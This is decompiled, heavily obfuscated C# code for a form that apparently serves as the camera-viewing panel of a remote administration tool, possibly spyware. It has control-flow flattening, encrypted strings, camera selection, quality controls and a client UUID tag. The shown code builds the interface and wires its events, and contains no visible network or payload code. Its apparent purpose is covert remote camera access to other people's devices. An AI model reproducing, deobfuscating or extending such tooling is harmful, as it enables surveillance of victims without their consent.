            this.combotext.Size = new Size(65, 26);
            num1 = (int) num2 * 763522661 ^ -171667935;
            continue;
          case 163:
            this.pinbtn.Cursor = Cursors.Hand;
            this.pinbtn.FillColor = Color.Transparent;
            num1 = (int) num2 * -1353949770 ^ 193096600;
            continue;
          case 164:
            this.TOpacity = new Timer(((Color_Box0) this).components);
            num1 = (int) num2 * -1506782200 ^ 369591192;
            continue;
          case 165:
            this.startbtn.Location = new Point(54, 6);
            num1 = (int) num2 * -1739836997 ^ -426655908;
            continue;
          case 166:
            this.Panel2.Size = new Size(786, 39);
            num1 = (int) num2 * 182272820 ^ 1816870579;
            continue;
          case 167:
            this.statustext.Font = new Font(EXGuarder.\u0032D603C5F, 8.7f);
            this.statustext.ForeColor = Color.Lime;
            this.statustext.Location = new Point(0, 0);
            this.statustext.Name = EXGuarder.\u00316060609;
            num1 = (int) num2 * 1904770388 ^ -1765560892;
            continue;
          case 168:
            this.Panel2.Dock = DockStyle.Bottom;
            num1 = (int) num2 * -817075005 ^ 1144785262;
            continue;
          case 169:
            ((ISupportInitialize) this.ClientPic).BeginInit();
            this.Panel3.SuspendLayout();
            num1 = (int) num2 * 752963330 ^ -288868664;
            continue;
          case 170:
            this.Sbtn.FillDisableColor = Color.FromArgb(25, 25, 25);
            num1 = (int) num2 * 759658025 ^ -330647625;
            continue;
          case 171:
            this.hidetoolbtn.TagString = EXGuarder.\u00356535F16;
            num1 = (int) num2 * -1808285402 ^ -1072845755;
            continue;
          case 172:
            this.DrakeUILampLED1.Dock = DockStyle.Right;
            num1 = (int) num2 * -694649890 ^ 598775702;
            continue;
          case 173:
            this.comboqualty.Text = EXGuarder.\u003213D4F41;
            num1 = (int) num2 * -1540773088 ^ 593177187;
            continue;
          case 174:
            this.Button3.Style = UIStyle.Custom;
            num1 = (int) num2 * -1471334074 ^ 1000220011;
            continue;
          case 175:
            this.MaximizeBox = false;
            num1 = (int) num2 * -1994135452 ^ 120134075;
            continue;
          case 176:
            this.Button3.StyleCustomMode = true;
            num1 = (int) num2 * 925957021 ^ 1267918543;
            continue;
          case 177:
            ((ISupportInitialize) this.CAM0).BeginInit();
            this.Panel1.SuspendLayout();
            num1 = (int) num2 * -1530761221 ^ -1579155013;
            continue;
          case 178:
            this.Panel2.TabIndex = 1;
            num1 = (int) num2 * 49384480 ^ -1655658748;
            continue;
          case 179:
            this.Sbtn.Font = new Font(EXGuarder.\u0032D603C5F, 12f);
            this.Sbtn.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.Sbtn.Location = new Point(241, 6);
            this.Sbtn.Name = EXGuarder.\u00351274C08;
            num1 = (int) num2 * 794824589 ^ 896922395;
            continue;
          case 180:
            this.Button3.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            this.Button3.AvatarSize = 30;
            num1 = (int) num2 * -1870645896 ^ -299326552;
            continue;
          case 181:
            this.comboqualty.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.comboqualty.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * -307808385 ^ -483705988;
            continue;
          case 182:
            this.CAM0.Location = new Point(0, 17);
            this.CAM0.Name = EXGuarder.\u0030924292A;
            num1 = (int) num2 * -1454647123 ^ -1064992550;
            continue;
          case 183:
            this.startbtn.FillColor = Color.Black;
            this.startbtn.FillDisableColor = Color.FromArgb(25, 25, 25);
            this.startbtn.Font = new Font(EXGuarder.\u0032D603C5F, 12f);
            this.startbtn.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 667242237 ^ 1737817642;
            continue;
          case 184:
            this.combocam.DropDownStyle = UIDropDownStyle.DropDownList;
            num1 = (int) num2 * -1675029952 ^ -1549998184;
            continue;
          case 185:
            this.Label1.Name = EXGuarder.\u0032B0D4D0B;
            num1 = (int) num2 * -1386733598 ^ -289121469;
            continue;
          case 186:
            this.ClientPic.SizeMode = PictureBoxSizeMode.Zoom;
            this.ClientPic.TabIndex = 11;
            num1 = (int) num2 * 347628466 ^ -1803629289;
            continue;
          case 187:
            this.Label2.Text = EXGuarder.\u003755E663F;
            num1 = (int) num2 * 324573703 ^ -503464230;
            continue;
          case 188:
            this.Panel4.Size = new Size(786, 16);
            this.Panel4.TabIndex = 1;
            num1 = (int) num2 * -1117190157 ^ -8627003;
            continue;
          case 189:
            this.DrakeUIAvatar2.Size = new Size(34, 28);
            num1 = (int) num2 * -332362014 ^ -656853788;
            continue;
          case 190:
            this.Controls.Add((Control) this.Panel1);
            this.Controls.Add((Control) this.Panel2);
            num1 = (int) num2 * -430900939 ^ 364748618;
            continue;
          case 191:
            this.combocam.TabIndex = 45;
            num1 = (int) num2 * 1057049442 ^ -1265220036;
            continue;
          case 192:
            this.combosizes.ForeColor = Color.White;
            this.combosizes.Location = new Point(577, 9);
            this.combosizes.Margin = new Padding(4, 5, 4, 5);
            this.combosizes.MaxDropDownItems = 25;
            this.combosizes.MinimumSize = new Size(63, 0);
            num1 = (int) num2 * 1972167347 ^ -2059316766;
            continue;
          case 193:
            this.combocam.MinimumSize = new Size(63, 0);
            this.combocam.Name = EXGuarder.\u00332454B77;
            num1 = (int) num2 * -423935390 ^ -1286848902;
            continue;
          case 194:
            this.CAM0.Dock = DockStyle.Fill;
            num1 = (int) num2 * 752357654 ^ -1597528677;
            continue;
          case 195:
            this.cmbofoucs.BackColor = Color.Black;
            num1 = (int) num2 * -1053678198 ^ -1423365749;
            continue;
          case 196:
            this.Panel1.TabIndex = 3;
            num1 = (int) num2 * -1322512417 ^ 1541034986;
            continue;
          case 197:
            this.pinbtn.Symbol = 61581;
            this.pinbtn.SymbolSize = 30;
            num1 = (int) num2 * 1386747704 ^ -1286877315;
            continue;
          case 198:
            this.pinbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * -110477777 ^ 729929913;
            continue;
          case 199:
            this.Panel3.Size = new Size(55, 486);
            num1 = (int) num2 * 493495298 ^ 1148398256;
            continue;
          case 200:
            this.Panel2.Controls.Add((Control) this.Label1);
            num1 = (int) num2 * -179341765 ^ 1147962402;
            continue;
          case 201:
            this.hidetoolbtn.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            this.hidetoolbtn.BackColor = Color.Transparent;
            this.hidetoolbtn.Cursor = Cursors.Hand;
            this.hidetoolbtn.FillColor = Color.Transparent;
            this.hidetoolbtn.Font = new Font(EXGuarder.\u0032D603C5F, 12f);
            num1 = (int) num2 * -1741720325 ^ 1608592490;
            continue;
          case 202:
            this.Panel2.Name = EXGuarder.\u003472F0739;
            num1 = (int) num2 * -895626886 ^ -709547704;
            continue;
          case 203:
            this.startbtn.Name = EXGuarder.\u0032B042562;
            this.startbtn.Radius = 15;
            num1 = (int) num2 * 1187201087 ^ 300986002;
            continue;
          case 204:
            this.DrakeUIToolTip1.SetToolTip((Control) this.DrakeUIAvatar2, EXGuarder.\u0031D441254);
            num1 = (int) num2 * -134907938 ^ -414010735;
            continue;
          default:
            goto label_207;
        }
      }
label_3:
      return;
label_207:;
    }

    internal virtual PictureBox CAM0
    {
      get => ((Color_Box0) this)._CAM0;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler1 = new EventHandler(this.CAM0_MouseHover);
label_1:
        int num1 = -1800875639;
        while (true)
        {
          int num2 = num1;
          uint num3;
          PictureBox caM0;
          EventHandler eventHandler2;
          switch ((num3 = (uint) -~(-2104632260 - -(num2 * 154261553) - (1008807918 - 1648171169))) % 9U)
          {
            case 0:
              caM0 = ((Color_Box0) this)._CAM0;
              int num4 = caM0 == null ? -1427570641 : (num4 = 1910629650);
              num1 = num4 ^ (int) num3 * 2008052860;
              continue;
            case 1:
              caM0.MouseLeave += eventHandler2;
              num1 = (int) num3 * -2086939483 ^ -1035242246;
              continue;
            case 2:
              caM0 = ((Color_Box0) this)._CAM0;
              int num5 = caM0 == null ? 1436523475 : (num5 = 1587281244);
              num1 = num5 ^ (int) num3 * -248327826;
              continue;
            case 3:
              goto label_1;
            case 4:
              caM0.MouseHover += eventHandler1;
              num1 = (int) num3 * 357571506 ^ -1970500633;
              continue;
            case 5:
              caM0.MouseHover -= eventHandler1;
              caM0.MouseLeave -= eventHandler2;
              num1 = (int) num3 * -1155987099 ^ 1073536101;
              continue;
            case 6:
              goto label_3;
            case 7:
              ((Color_Box0) this)._CAM0 = value;
              num1 = 931504701;
              continue;
            case 8:
              eventHandler2 = new EventHandler(this.CAM0_MouseLeave);
              num1 = (int) num3 * -1191750665 ^ -701763314;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual Timer Frames
    {
      get => ((Color_Box0) this)._Frames;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Frames_Tick);
        Timer frames = ((Color_Box0) this)._Frames;
label_1:
        int num1 = 665452425;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((~num1 ^ (~-2080911677 ^ -1125569046) * 828400673 * 1917279925) - (1511926173 + (1323473448 + 80614212 - (209992537 - 1829413852))))) % 8U)
          {
            case 0:
              goto label_3;
            case 1:
              frames = ((Color_Box0) this)._Frames;
              num1 = (int) num2 * -1382914294 ^ -1295476659;
              continue;
            case 2:
              int num3 = frames == null ? -1191863283 : (num3 = -1068343453);
              num1 = num3 ^ (int) num2 * -1926238432;
              continue;
            case 3:
              goto label_1;
            case 4:
              int num4 = frames == null ? 1524352188 : (num4 = 1938030846);
              num1 = num4 ^ (int) num2 * -732571147;
              continue;
            case 5:
              ((Color_Box0) this)._Frames = value;
              num1 = 1550695724;
              continue;
            case 6:
              frames.Tick += eventHandler;
              num1 = (int) num2 * -1652675905 ^ 1708083831;
              continue;
            case 7:
              frames.Tick -= eventHandler;
              num1 = (int) num2 * -1524881588 ^ -1781916556;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Timer TOpacity
    {
      get => ((Color_Box0) this)._TOpacity;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TOpacity_Tick);
        Timer topacity = ((Color_Box0) this)._TOpacity;
label_1:
        int num1 = -1353907994;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-((num1 * -2146843181 ^ ~(1844885475 ^ 1666735135) - (597372532 ^ -131930347) * -630222237 + ~(-1913461193 + 1129742510 * -1161635741)) - (~865465911 + 1797276755 * 981403233 ^ -517721091 * (1645901630 - 500176778)) ^ 1341048001) - 1945300898)) % 7U)
          {
            case 0:
              ((Color_Box0) this)._TOpacity = value;
              num1 = -16862033;
              continue;
            case 1:
              int num3 = topacity == null ? -282134488 : (num3 = -134711890);
              num1 = num3 ^ (int) num2 * 1779685396;
              continue;
            case 2:
              topacity = ((Color_Box0) this)._TOpacity;
              int num4 = topacity == null ? 1075137264 : (num4 = 948891640);
              num1 = num4 ^ (int) num2 * 480449848;
              continue;
            case 3:
              topacity.Tick -= eventHandler;
              num1 = (int) num2 * -1931587641 ^ -152839266;
              continue;
            case 4:
              goto label_1;
            case 5:
              topacity.Tick += eventHandler;
              num1 = (int) num2 * -636305731 ^ 1654000520;
              continue;
            case 6:
              goto label_3;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Panel Panel1
    {
      get => ((Color_Box0) this)._Panel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Color_Box0) this)._Panel1 = value;
    }

    internal virtual Panel Panel2
    {
      get => ((Color_Box0) this)._Panel2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Color_Box0) this)._Panel2 = value;
    }

    internal virtual PictureBox ClientPic
    {
      get => ((Color_Box0) this)._ClientPic;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Color_Box0) this)._ClientPic = value;
    }

    internal virtual Label Label1
    {
      get => ((Color_Box0) this)._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Color_Box0) this)._Label1 = value;
    }

    internal virtual ComboBox cmbofoucs
    {
      get => ((Color_Box0) this)._cmbofoucs;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Color_Box0) this)._cmbofoucs = value;
    }

    internal virtual Label Label2
    {
      get => ((Color_Box0) this)._Label2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Color_Box0) this)._Label2 = value;
    }

    internal virtual Panel Panel4
    {
      get => ((Color_Box0) this)._Panel4;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Color_Box0) this)._Panel4 = value;
    }

    internal virtual Label statustext
    {
      get => ((Color_Box0) this)._statustext;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Color_Box0) this)._statustext = value;
    }

    internal virtual ToolTip ToolTip1
    {
      get => ((Color_Box0) this)._ToolTip1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Color_Box0) this)._ToolTip1 = value;
    }

    internal virtual DrakeUIButton Sbtn
    {
      get => ((Color_Box0) this)._Sbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButton2_Click);
        DrakeUIButton sbtn = ((Color_Box0) this)._Sbtn;
label_1:
        int num1 = -226965745;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((~num1 ^ ~((-1844295020 ^ -274344159) + (-999574245 - -641474131) ^ ~774911922 + -1630084017 * 1845784735)) * -1385599531 * 594712801 + (-998052048 - 306906115))) % 7U)
          {
            case 0:
              sbtn.Click += eventHandler;
              num1 = (int) num2 * 2025437669 ^ 244934250;
              continue;
            case 1:
              int num3 = sbtn == null ? -1142033186 : (num3 = 2001445537);
              num1 = num3 ^ (int) num2 * 1865847281;
              continue;
            case 2:
              ((Color_Box0) this)._Sbtn = value;
              num1 = 1406103769;
              continue;
            case 3:
              goto label_1;
            case 4:
              goto label_3;
            case 5:
              sbtn = ((Color_Box0) this)._Sbtn;
              int num4 = sbtn == null ? -346298887 : (num4 = -1292551415);
              num1 = num4 ^ (int) num2 * -1801205237;
              continue;
            case 6:
              sbtn.Click -= eventHandler;
              num1 = (int) num2 * -1532335110 ^ -889000511;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DrakeUILampLED DrakeUILampLED1
    {
      get => ((Color_Box0) this)._DrakeUILampLED1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Color_Box0) this)._DrakeUILampLED1 = value;
      }
    }

    internal virtual DrakeUIToolTip DrakeUIToolTip1
    {
      get => ((ContactsManager) this)._DrakeUIToolTip1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((ContactsManager) this)._DrakeUIToolTip1 = value;
      }
    }

    internal virtual DrakeUIAvatar Button3
    {
      get => ((ContactsManager) this)._Button3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Addpo_Click);
        DrakeUIAvatar button3 = ((ContactsManager) this)._Button3;
        if (button3 == null)
          goto label_5;
label_1:
        int num1 = -700156047;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~(num1 * -1535190887 - (--1464489374 - -1476211061 * 1643523709 ^ -888833847 * (-1463100769 * -1775194709) ^ ~((1556909363 - 1829878974) * -1055221355)) + -259815737) * 1384770519 - 1964323786)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              button3.Click += eventHandler;
              num1 = (int) num2 * 618406038 ^ -1426071605;
              continue;
            case 2:
              goto label_5;
            case 3:
              button3.Click -= eventHandler;
              num1 = (int) num2 * 941493407 ^ 752586849;
              continue;
            case 4:
              int num3 = button3 == null ? -390658035 : (num3 = -542393497);
              num1 = num3 ^ (int) num2 * -107575768;
              continue;
            case 5:
              button3 = ((ContactsManager) this)._Button3;
              num1 = (int) num2 * 944013287 ^ -1943755834;
              continue;
            case 6:
              goto label_3;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:
        return;
label_5:
        ((ContactsManager) this)._Button3 = value;
        num1 = -1644595348;
        goto label_2;
      }
    }

    internal virtual DrakeUIAvatar DrakeUIAvatar2
    {
      get => ((ContactsManager) this)._DrakeUIAvatar2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIAvatar2_Click);
label_1:
        int num1 = -628417345;
        DrakeUIAvatar drakeUiAvatar2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (---(num1 * 1258547587 - (~~916572291 + (908331257 - -507930085) * 811760337) * 1432748609) * -1130413391)) % 7U)
          {
            case 0:
              drakeUiAvatar2.Click -= eventHandler;
              num1 = (int) num2 * -141326178 ^ 1454811828;
              continue;
            case 1:
              drakeUiAvatar2 = ((ContactsManager) this)._DrakeUIAvatar2;
              num1 = (int) num2 * -2140084240 ^ -1805258214;
              continue;
            case 2:
              goto label_1;
            case 3:
              ((ContactsManager) this)._DrakeUIAvatar2 = value;
              drakeUiAvatar2 = ((ContactsManager) this)._DrakeUIAvatar2;
              int num3;
              num1 = num3 = drakeUiAvatar2 == null ? 1511880782 : (num3 = -1088884182);
              continue;
            case 4:
              drakeUiAvatar2.Click += eventHandler;
              num1 = (int) num2 * -2085683134 ^ 96851368;
              continue;
            case 5:
              int num4 = drakeUiAvatar2 == null ? -213159673 : (num4 = -378615546);
              num1 = num4 ^ (int) num2 * 926233629;
              continue;
            case 6:
              goto label_3;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Label combotext
    {
      get => ((ContactsManager) this)._combotext;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((ContactsManager) this)._combotext = value;
      }
    }

    public virtual DrakeUIComboBox combosizes
    {
      get => ((ContactsManager) this)._combosizes;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((ContactsManager) this)._combosizes = value;
      }
    }

    internal virtual Label qultytext
    {
      get => ((ContactsManager) this)._qultytext;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((ContactsManager) this)._qultytext = value;
      }
    }

    public virtual DrakeUIComboBox comboqualty
    {
      get => ((ContactsManager) this)._comboqualty;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((ContactsManager) this)._comboqualty = value;
      }
    }

    internal virtual Timer savetimer
    {
      get => ((ContactsManager) this)._savetimer;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Savetimer_Tick);
        Timer savetimer = ((ContactsManager) this)._savetimer;
label_1:
        int num1 = 1487084580;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((num1 - (-(-(1189519454 + 1473598995) - (172506353 * 131132363 - -216421154)) + (-(-263460884 ^ 1792529030 ^ --1241394213) + (~-219730066 + -~-117290240)))) * 1580753899 ^ 1571612159)) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              ((ContactsManager) this)._savetimer = value;
              savetimer = ((ContactsManager) this)._savetimer;
              int num3;
              num1 = num3 = savetimer == null ? -1245928184 : (num3 = -992100411);
              continue;
            case 2:
              int num4 = savetimer == null ? 53469735 : (num4 = 341810915);
              num1 = num4 ^ (int) num2 * -655067789;
              continue;
            case 3:
              savetimer.Tick += eventHandler;
              num1 = (int) num2 * -2029704212 ^ -1873929908;
              continue;
            case 4:
              goto label_3;
            case 5:
              savetimer.Tick -= eventHandler;
              num1 = (int) num2 * 971526214 ^ -1748106873;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    internal virtual Label fpstext
    {
      get => ((ContactsManager) this)._fpstext;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ContactsManager) this)._fpstext = value;
    }

    public virtual DrakeUIComboBox combocam
    {
      get => ((ContactsManager) this)._combocam;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((ContactsManager) this)._combocam = value;
      }
    }

    internal virtual DrakeUIButton startbtn
    {
      get => ((ContactsManager) this)._startbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButton1_Click_3);
label_1:
        int num1 = -560563903;
        while (true)
        {
          int num2 = num1;
          uint num3;
          DrakeUIButton startbtn;
          switch ((num3 = (uint) -(-(-1355010130 - 305560202 ^ ~1929406115) - -(num2 ^ ~(-~(-1351041175 - 495809980) + (~(-631455818 ^ -1090509961) + (~-785887039 ^ ~913537269)))) - -(588808952 - 470196632) ^ 1907911722 ^ -871309435)) % 6U)
          {
            case 0:
              goto label_3;
            case 1:
              ((ContactsManager) this)._startbtn = value;
              startbtn = ((ContactsManager) this)._startbtn;
              int num4;
              num1 = num4 = startbtn == null ? -1828835292 : (num4 = -1297467484);
              continue;
            case 2:
              startbtn.Click += eventHandler;
              num1 = (int) num3 * 550916840 ^ -2002110716;
              continue;
            case 3:
              startbtn = ((ContactsManager) this)._startbtn;
              int num5 = startbtn == null ? -1582406986 : (num5 = 725064786);
              num1 = num5 ^ (int) num3 * -83480107;
              continue;
            case 4:
              goto label_1;
            case 5:
              startbtn.Click -= eventHandler;
              num1 = (int) num3 * -1843793347 ^ 2084963582;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    internal virtual DrakeUIButtonIcon hidetoolbtn
    {
      get => ((ContactsManager) this)._hidetoolbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon1_Click);
label_1:
        int num1 = -749559532;
        DrakeUIButtonIcon hidetoolbtn;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((-(num1 ^ -(-~(706784393 * -588218407) * 1119298603)) - (1885072125 * (-2108926929 * -561247617) - 1905322794) ^ ~-1492679391 ^ 1830811232 ^ -1216240032 ^ 559391938 + 442778847) + 1693830773)) % 7U)
          {
            case 0:
              ((ContactsManager) this)._hidetoolbtn = value;
              hidetoolbtn = ((ContactsManager) this)._hidetoolbtn;
              int num3;
              num1 = num3 = hidetoolbtn == null ? -2023916358 : (num3 = -1101693836);
              continue;
            case 1:
              hidetoolbtn.Click += eventHandler;
              num1 = (int) num2 * 1038471595 ^ 1525329853;
              continue;
            case 2:
              goto label_1;
            case 3:
              int num4 = hidetoolbtn == null ? 942383426 : (num4 = -520488779);
              num1 = num4 ^ (int) num2 * -1362495531;
              continue;
            case 4:
              goto label_3;
            case 5:
              hidetoolbtn = ((ContactsManager) this)._hidetoolbtn;
              num1 = (int) num2 * 973496943 ^ 129070076;
              continue;
            case 6:
              hidetoolbtn.Click -= eventHandler;
              num1 = (int) num2 * -1422715676 ^ 854331390;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DrakeUIButtonIcon pinbtn
    {
      get => ((ContactsManager) this)._pinbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon1_Click_1);
        DrakeUIButtonIcon pinbtn = ((ContactsManager) this)._pinbtn;
label_1:
        int num1 = -795564795;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (~(969936727 * (-1905345098 ^ -1804393946)) - (num2 * -1340451981 - ((1084850694 ^ -2050451995 ^ 1483980390 * 1620634301) + -(1596464334 - 1617063754) ^ 1964601432)))) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              int num4 = pinbtn == null ? 1376726355 : (num4 = 2084778708);
              num1 = num4 ^ (int) num3 * 2028936151;
              continue;
            case 2:
              ((ContactsManager) this)._pinbtn = value;
              pinbtn = ((ContactsManager) this)._pinbtn;
              int num5;
              num1 = num5 = pinbtn == null ? 1406300269 : (num5 = -1447167110);
              continue;
            case 3:
              pinbtn.Click -= eventHandler;
              num1 = (int) num3 * -898782306 ^ -1932572842;
              continue;
            case 4:
              pinbtn.Click += eventHandler;
              num1 = (int) num3 * 1244513548 ^ 1448898101;
              continue;
            case 5:
              goto label_3;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    internal virtual Panel Panel3
    {
      get => ((ContactsManager) this)._Panel3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ContactsManager) this)._Panel3 = value;
    }

    private void TOpacity_Tick(object sender, EventArgs e)
    {
      if (this.Opacity == 1.0)
        goto label_5;
label_1:
      int num1 = 735924270;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~-(num1 * -181303075 * 1313657945 * -1719665521) ^ -1923417172)) % 4U)
        {
          case 0:
            goto label_5;
          case 1:
            this.Opacity += 0.1;
            num1 = (int) num2 * -804049790 ^ -2024163649;
            continue;
          case 2:
            goto label_3;
          case 3:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:
      return;
label_5:
      this.TOpacity.Enabled = false;
      num1 = -41996971;
      goto label_2;
    }

    public void addsizes(object[] objs)
    {
      if (!this.InvokeRequired)
        goto label_6;
label_1:
      int num1 = -1963739657;
label_2:
      string[] strArray1;
      string[] strArray2;
      int index;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~(-num1 - ~~-780969268 * -1516371001)) % 13U)
        {
          case 0:
            num1 = (int) num2 * 382286177 ^ 1507747860;
            continue;
          case 1:
            this.combosizes.Items.Add((object) str.Replace(EXGuarder.\u0030700501C, EXGuarder.\u00333210A2B).Replace(EXGuarder.\u003706A720C, EXGuarder.\u00333210A2B));
            checked { ++index; }
            num1 = (int) num2 * 1547035207 ^ -1321163488;
            continue;
          case 2:
            this.combosizes.Text = strArray1[0];
            this.combosizes.MaxDropDownItems = strArray1.Length;
            num1 = (int) num2 * 405929482 ^ 1479708455;
            continue;
          case 3:
            str = strArray2[index];
            num1 = -1809111474;
            continue;
          case 4:
            strArray2 = strArray1;
            num1 = (int) num2 * 886075739 ^ 976482886;
            continue;
          case 5:
            goto label_1;
          case 6:
            // ISSUE: method pointer
            this.Invoke((Delegate) new CameraManager((object) this, __methodptr(addsizes)), (object) objs);
            num1 = (int) num2 * 1942097697 ^ 1695894595;
            continue;
          case 7:
            int num3 = strArray1.Length <= 0 ? 778971330 : (num3 = -983530575);
            num1 = num3 ^ (int) num2 * -809515029;
            continue;
          case 8:
            goto label_6;
          case 9:
            int num4;
            num1 = num4 = index < strArray2.Length ? 2064564057 : (num4 = -1111294184);
            continue;
          case 10:
            index = 0;
            num1 = (int) num2 * -1235304337 ^ 71826676;
            continue;
          case 11:
            goto label_3;
          case 12:
            int num5 = strArray1 == null ? -1744237373 : (num5 = 1272078020);
            num1 = num5 ^ (int) num2 * 451344374;
            continue;
          default:
            goto label_15;
        }
      }
label_3:
      return;
label_15:
      return;
label_6:
      strArray1 = (string[]) objs[0];
      num1 = -1436165812;
      goto label_2;
    }

    private void tranlsateme()
    {
      string language = RegistryHandler.Get_Language();
      if (Operators.CompareString(language, EXGuarder.\u0030B274830, false) == 0)
        goto label_11;
label_1:
      int num1 = -239833038;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~~(num1 ^ (~-353865843 ^ -1693686811 * 1729204611) - ~(-1819069228 - 1140444438) - ~((1756246845 ^ -1486972856) - (-56671903 ^ -180019603)) + -~(~341555477 ^ -43498031 ^ 1771249815)) - -525390977 * (681668003 * 910638558))) % 10U)
        {
          case 0:
            goto label_1;
          case 1:
            int num3 = Operators.CompareString(language, EXGuarder.\u00362406C06, false) != 0 ? -414698365 : (num3 = 213285600);
            num1 = num3 ^ (int) num2 * -210752151;
            continue;
          case 2:
            this.qultytext.Text = Codes.Translate(this.qultytext.Text, EXGuarder.\u0031B375B4E, EXGuarder.\u0032E4F1101);
            num1 = (int) num2 * -1571757313 ^ 389901624;
            continue;
          case 3:
            this.Sbtn.Text = Codes.Translate(this.Sbtn.Text, EXGuarder.\u0031B375B4E, EXGuarder.\u0032E4F1101);
            this.combotext.Text = Codes.Translate(this.combotext.Text, EXGuarder.\u0031B375B4E, EXGuarder.\u0032E4F1101);
            num1 = (int) num2 * -1718459338 ^ -876904981;
            continue;
          case 4:
            this.startbtn.Text = Codes.Translate(this.startbtn.Text, EXGuarder.\u0031B375B4E, EXGuarder.\u0032B1B0932);
            this.Sbtn.Text = Codes.Translate(this.Sbtn.Text, EXGuarder.\u0031B375B4E, EXGuarder.\u0032B1B0932);
            num1 = (int) num2 * -30970113 ^ 453101165;
            continue;
          case 5:
            goto label_11;
          case 6:
            num1 = (int) num2 * 1034493180 ^ 82927520;
            continue;
          case 7:
            this.qultytext.Text = Codes.Translate(this.qultytext.Text, EXGuarder.\u0031B375B4E, EXGuarder.\u0032B1B0932);
            num1 = (int) num2 * 1540642495 ^ 1169057650;
            continue;
          case 8:
            this.combotext.Text = Codes.Translate(this.combotext.Text, EXGuarder.\u0031B375B4E, EXGuarder.\u0032B1B0932);
            num1 = (int) num2 * 1055142162 ^ -1763298388;
            continue;
          case 9:
            goto label_3;
          default:
            goto label_12;
        }
      }
label_3:
      return;
label_12:
      return;
label_11:
      this.startbtn.Text = Codes.Translate(this.startbtn.Text, EXGuarder.\u0031B375B4E, EXGuarder.\u0032E4F1101);
      num1 = -1813459364;
      goto label_2;
    }

    private void CameraManager_Load(object sender, EventArgs e)
    {
      // ISSUE: reference to a compiler-generated field
      this.Tag = (object) (EXGuarder.\u003346C4C35 + ((Data._Closure\u0024__39\u002D12) ((ContactsManager) this).classClient).UUID);
      this.Icon = new Icon(Settings.res_Path + EXGuarder.\u0031A661E41);
label_1:
      int num1 = -1443642946;
      IntPtr hWndInsertAfter;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -~(~(-num1 * -526324731) * -750202777)) % 7U)
        {
          case 0:
            this.Frames.Start();
